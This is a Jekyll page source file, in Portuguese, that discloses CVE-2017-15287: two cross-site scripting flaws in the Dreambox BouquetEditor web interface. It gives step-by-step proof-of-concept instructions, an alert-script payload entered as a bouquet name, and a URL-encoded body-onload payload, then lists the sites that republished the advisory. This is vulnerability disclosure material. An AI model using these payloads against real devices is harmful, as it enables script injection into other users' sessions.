---
title: CVE
permalink: "/cve/"
vulnerability-xss-dreambox: |-
  <h2>[CVE-2017-15287] Vulnerability XSS - Dreambox</h2>

  <p>Prova de Conceito (Proof of Concept - PoC), que virou o <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15287" target="_blank" rel="noopenner noreferrer">CVE-2017-15287</a> por Thiago “THX”.</p>

  <h3 id="sobre-o-software">Sobre o Software:</h3>

  <p>O Dreambox é um produto da Dream-Multimedia-TV (DMM), que é desenvolvido por receptores baseados em Linux sob o nome Dreambox.</p>

  <h3 id="as-vulnerabilidades">As vulnerabilidades:</h3>

  <h4 id="vulnerabilidade-1">Vulnerabilidade 1</h4>

  <p>O XSS está presente em duas áreas, sendo que na primeira área a vulnerabilidade se encontra em um WebPlugin chamado “BouquetEditor”:</p>

  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://IP:PORT/bouqueteditor/
  </code></pre></div></div>

  <p>Passos:</p>

  <ol>
    <li>Na aba Bouquets, ira adicionar uma nova bouquet</li>
  </ol>

  <p><img src="https://fireshellsecurity.team/assets/images/posts/xxs/1.png" alt="Passo 1" /></p>

  <ol>
    <li>Assim, irar colocar o script:</li>
  </ol>

  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(&lt;script&gt;alert('XSS')&lt;/script&gt;)
  </code></pre></div></div>

  <p><img src="https://fireshellsecurity.team/assets/images/posts/xxs/2.png" alt="Passo 2" /></p>

  <ol>
    <li>Vulnerability XSS</li>
  </ol>

  <p><img src="https://fireshellsecurity.team/assets/images/posts/xxs/3.png" alt="Passo 3" /></p>

  <h4 id="vulnerabilidade-2">Vulnerabilidade 2</h4>

  <p>A segunda falha consiste em colocar a variavel abaixo depois da url (http://IP:PORT)</p>

  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Variavel :/file?file=%3CBODY%20ONLOAD=alert(%27XSS%27)%3E
  </code></pre></div></div>

  <p><img src="https://fireshellsecurity.team/assets/images/posts/xxs/4.png" alt="XSS via endereço" /></p>

  <h3 id="compartilhamentos">Compartilhamentos:</h3>

  <p>Sites que já compatilharam o CVE:</p>

  <p><a href="https://fr.0day.today/exploit/description/28784" target="_blank" rel="noopenner noreferrer">0day</a></p>

  <p><a href="https://www.certsi.es/alerta-temprana/vulnerabilidades/cve-2017-15287" target="_blank" rel="noopenner noreferrer">CERTSI</a></p>

  <p><a href="https://cxsecurity.com/issue/WLB-2017100103" target="_blank" rel="noopenner noreferrer">CXSecurity</a></p>

  <p><a href="https://www.exploit-db.com/exploits/42986/" target="_blank" rel="noopenner noreferrer">Exploit Database</a></p>

  <p><a href="http://exploit.kitploit.com/2017/10/dreambox-plugin-bouqueteditor-cross.html" target="_blank" rel="noopenner noreferrer">Exploit Kitploit</a></p>

  <p><a href="https://hackertor.com/2017/10/12/na-cve-2017-15287-there-is-xss-in-the-bouqueteditor-webplugin-for/" target="_blank" rel="noopenner noreferrer">HackerTor</a></p>

  <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15287" target="_blank" rel="noopenner noreferrer">NVD</a></p>

  <p><a href="https://packetstormsecurity.com/files/144604/dreambox200be-xss.txt" target="_blank" rel="noopenner noreferrer">PacketStorm</a></p>

  <p><a href="https://www.security-database.com/detail.php?alert=CVE-2017-15287&amp;utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed:+Last100Alerts+(Security-Database+Alerts+Monitor+:+Last+100+Alerts)" target="_blank" rel="noopenner noreferrer">Security Database</a></p>

  <p><a href="https://www.secnews24.com/2017/10/12/cve-2017-15287-there-is-xss-in-the-bouqueteditor-webplugin-for-dream-multimedia-dreambox-devices-as-demo/" target="_blank" rel="noopenner noreferrer">SecNews24</a></p>

  <p><a href="https://tsecurity.de/de/215878/Reversing-Engineering/Exploits/Dream-Multimedia-Dreambox-/file-Cross-Site-Scripting/" target="_blank" rel="noopenner noreferrer">TSecurity</a></p>

  <p><a href="https://vuldb.com/fr/?id.107825" target="_blank" rel="noopenner noreferrer">VulDB</a></p>
layout: page
---

<li>
    <a href="/vulnerability-xss-dreambox/" class="post-article">[CVE-2017-15287] Vulnerability XSS - Dreambox</a>
</li>